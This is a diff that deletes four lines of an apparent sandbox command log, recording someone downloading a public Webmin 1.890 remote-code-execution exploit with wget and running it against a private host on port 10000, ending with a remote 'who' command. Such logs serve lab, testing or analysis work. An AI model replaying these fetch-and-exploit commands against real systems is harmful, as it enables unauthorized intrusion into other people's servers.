@@ -1,4 +1,0 @@
-{"sandbox_id": "123", "timestamp_str": "2021-06-30T06:43:01.383Z", "cmd_type": "bash-command", "cmd": "wget https://raw.githubusercontent.com/foxsin34/WebMin-1.890-Exploit-unauthorized-RCE/master/webmin-1.890_exploit.py"}
-{"sandbox_id": "123", "timestamp_str": "2021-06-30T06:43:11.057Z", "cmd_type": "bash-command", "cmd": "python3 webmin-1.890_exploit.py"}
-{"sandbox_id": "123", "timestamp_str": "2021-06-30T06:43:28.216Z", "cmd_type": "bash-command", "cmd": "python3 webmin-1.890_exploit.py 10.1.26.9 10000"}
-{"sandbox_id": "123", "timestamp_str": "2021-06-30T06:43:54.740Z", "cmd_type": "bash-command", "cmd": "python3 webmin-1.890_exploit.py 10.1.26.9 10000 who"}
